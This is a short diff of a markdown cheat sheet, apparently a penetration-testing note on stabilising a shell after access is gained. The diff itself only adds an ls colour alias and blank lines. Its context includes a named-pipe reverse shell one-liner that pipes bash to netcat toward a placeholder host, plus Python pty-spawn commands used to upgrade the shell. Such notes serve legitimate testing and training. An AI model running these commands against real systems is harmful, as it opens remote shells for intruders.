@@ -26,13 +26,18 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ip 1234 >/tmp/f
 
 ```shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+alias ls='ls --color=auto'
 export TERM=xterm
 ```
+
 or just
+
 ```shell
 python -c 'import pty;pty.spawn("/bin/bash")'
+alias ls='ls --color=auto'
 export TERM=xterm
 ```
+
 if `python3` is not available.
 
 - Set up autocomplete. Background the shell using `CTRL + Z` and run 
